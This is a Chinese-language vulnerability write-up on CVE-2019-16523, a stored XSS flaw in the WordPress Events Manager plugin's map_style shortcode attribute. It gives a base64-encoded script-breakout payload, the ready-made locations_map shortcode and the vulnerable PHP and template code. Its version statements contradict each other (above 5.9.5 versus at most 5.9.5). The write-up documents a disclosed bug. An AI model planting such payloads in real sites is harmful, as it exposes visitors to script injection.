---
title: （CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss
id: zhfly3253
---

# （CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss

## 一、漏洞简介

WordPress的5.9.5版以上的事件管理器插件（又名“事件管理器”）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。

## 二、漏洞影响

wordpress <= 5.9.5

## 三、复现过程

### 1、利用过程

要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置 map_style为的base64编码值

```
{"a":"test\"</script><script>alert(1)</script>"}。 
```

这将导致以下简码：

```
[locations_map test="" map_style="eyJhIjoidGVzdFwiPC9zY3JpcHQ+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9Cg=="] 
```

然后可以将该短代码插入到帖子中，然后由恶意用户发布。任何访问该职位的人都会受到有效载荷的影响，因此是XSS攻击的受害者。

### 2、详细分析

Events Manager插件提供了用于创建地图小部件的短代码，例如用于显示事件的位置。通过map_style使用简码中的属性提供自定义样式，可以直观地调整这些地图。为了防止XSS ，在shortcode属性内使用HTML 受到限制。但是，在这种情况下，可以注入任意HTML和JavaScript，因为该 map_style属性需要一个以base64编码的JSON对象。这允许绕过消毒。简码locations_map和events_map受此问题影响：

在em-shortcode.php（第43-56行），我们可以看到该属性是经过base64解码的，然后使用json_decode进行了解析。如果JSON语法有效，则将删除空格并将对象作为map_json_style变量传递到模板。请参见下面的代码段：

```
//add JSON style to map
$style = '';
if( !empty($args['map_style']) ){
    $style= base64_decode($args['map_style']);
    $style_json= json_decode($style);
    if( is_array($style_json) || is_object($style_json) ){
        $style = preg_replace('/[\r\n\t\s]/', '', $style);
    }else{
        $style = '';
    }
    unset($args['map_style']);
}
ob_start();
em_locate_template('templates/map-global.php',true, array('args'=>$args, 'map_json_style' => $style)); 
```

在templates/templates/map-global.php（第16-21行）中，变量无需进一步编码即可插入脚本标签内：

```
<script type="text/javascript">
    if( typeof EM == 'object'){
        if( typeof EM.google_map_id_styles != 'object' ) EM.google_map_id_styles = [];
        EM.google_map_id_styles['<?php echo $args['random_id']; ?>'] = <?php echo $map_json_style; ?>;
    }
</script> 
```

这样就完美的构成了xss payload